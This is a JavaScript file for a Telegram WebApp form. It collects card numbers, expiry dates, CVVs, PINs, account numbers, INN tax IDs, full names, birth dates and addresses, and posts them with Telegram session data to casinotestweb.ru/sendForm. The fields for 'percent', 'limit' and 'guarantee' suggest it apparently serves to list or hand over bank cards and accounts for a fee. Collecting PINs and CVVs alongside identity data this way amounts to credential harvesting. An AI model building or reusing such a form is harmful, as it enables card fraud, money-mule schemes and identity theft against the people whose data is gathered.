const paymentMethodSelect = document.getElementById('payment-method');
const blockGuaranteeSection = document.getElementById('block-guarantee');
const percentSection = document.getElementById('percent');
const limitSection = document.getElementById('limit');
const timeValidity = document.getElementById('time-validity');
const bankSection = document.getElementById('bank-section');
const cardNumberSection = document.getElementById('card-number-section');
const expirationDateSection = document.getElementById('expiration-date-section');
const cvvSection = document.getElementById('cvv-section');
const pinSection = document.getElementById('pin-section');
const accountNumberSection = document.getElementById('account-number-section');
const innSection = document.getElementById('inn-section');
const fioSection = document.getElementById('fio-section');
const dobSection = document.getElementById('dob-section');
const addressSection = document.getElementById('address-section');
const sumSection = document.getElementById('sum-section');
const phoneNumberSection = document.getElementById('phone-number-section'); // Added for phone number selection
const submitButton = document.getElementById('submit-btn');


paymentMethodSelect.addEventListener('change', (e) => {
    const method = e.target.value;

    // Reset visibility
    blockGuaranteeSection.classList.add('hidden');
    percentSection.classList.add('hidden');
    limitSection.classList.add('hidden');
    bankSection.classList.add('hidden');
    cardNumberSection.classList.add('hidden');
    accountNumberSection.classList.add('hidden');
    innSection.classList.add('hidden');
    fioSection.classList.add('hidden');
    dobSection.classList.add('hidden');
    addressSection.classList.add('hidden');
    phoneNumberSection.classList.add('hidden');
    timeValidity.classList.add('hidden');
    cvvSection.classList.add('hidden');
    pinSection.classList.add('hidden');
    expirationDateSection.classList.add('hidden');

    if (method == 'cash') {
        blockGuaranteeSection.classList.remove('hidden');
        percentSection.classList.remove('hidden');
        limitSection.classList.remove('hidden');
        timeValidity.classList.remove('hidden');
        addressSection.classList.remove('hidden');
    } else if (method == 'nfc') {
        blockGuaranteeSection.classList.remove('hidden');
        percentSection.classList.remove('hidden');
        limitSection.classList.remove('hidden');
        bankSection.classList.remove('hidden');
        timeValidity.classList.remove('hidden');
        cardNumberSection.classList.remove('hidden');
        fioSection.classList.remove('hidden');
        dobSection.classList.remove('hidden');
        addressSection.classList.remove('hidden');
        phoneNumberSection.classList.remove('hidden');
        cvvSection.classList.remove('hidden');
        pinSection.classList.remove('hidden');
        expirationDateSection.classList.remove('hidden');
        accountNumberSection.classList.remove('hidden');
        innSection.classList.remove('hidden');
    } else if (method === 'transfer') {
        blockGuaranteeSection.classList.remove('hidden');
        percentSection.classList.remove('hidden');
        limitSection.classList.remove('hidden');
        bankSection.classList.remove('hidden');
        timeValidity.classList.remove('hidden');
        accountNumberSection.classList.remove('hidden');
        innSection.classList.remove('hidden');
        fioSection.classList.remove('hidden');
        dobSection.classList.remove('hidden');
        addressSection.classList.remove('hidden');
    } else if (method === 'sberbank') {
        blockGuaranteeSection.classList.remove('hidden');
        percentSection.classList.remove('hidden');
        limitSection.classList.remove('hidden');
        bankSection.classList.remove('hidden');
        timeValidity.classList.remove('hidden');
        cardNumberSection.classList.remove('hidden');
        accountNumberSection.classList.remove('hidden');
        fioSection.classList.remove('hidden');
        dobSection.classList.remove('hidden');
        addressSection.classList.remove('hidden');
        phoneNumberSection.classList.remove('hidden');
    } else if (method === 'card') {
        blockGuaranteeSection.classList.remove('hidden');
        percentSection.classList.remove('hidden');
        limitSection.classList.remove('hidden');
        bankSection.classList.remove('hidden');
        cardNumberSection.classList.remove('hidden');
        timeValidity.classList.remove('hidden');
        accountNumberSection.classList.remove('hidden');
        fioSection.classList.remove('hidden');
        dobSection.classList.remove('hidden');
        addressSection.classList.remove('hidden');
        expirationDateSection.classList.remove('hidden');
    }
});

submitButton.addEventListener('click', async () => {
    const response = await fetch('https://casinotestweb.ru/sendForm', {
        method: 'post',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
            initData: window.Telegram.WebApp.initData,
            method: document.getElementById('payment-method').value,
            block: document.getElementById('block-guarantee').value === 'yes',
            actual: parseInt(document.getElementById('time-validity').value),
            percent: parseInt(document.getElementById('percent').value),
            limit: parseInt(document.getElementById('limit').value),
            bank: document.getElementById('bank').value,
            phoneNumber: document.getElementById('phone-number').value,
            cardNumber: document.getElementById('card-number').value,
            expirationDate: document.getElementById('expiration-date').value,
            cvv: document.getElementById('cvv').value,
            pin: document.getElementById('pin').value,
            accountNumber: document.getElementById('account-number').value,
            inn: document.getElementById('inn').value,
            fullname: document.getElementById('fio').value,
            birthday: document.getElementById('dob').value,
            address: document.getElementById('address').value
        })
    });
    const json = await response.json();
    if (json.msg) {
        return window.Telegram.WebApp.showAlert('Произошла ошибка. Заполните все поля, либо попробуйте позже');
    }
    Telegram.WebApp.close();
})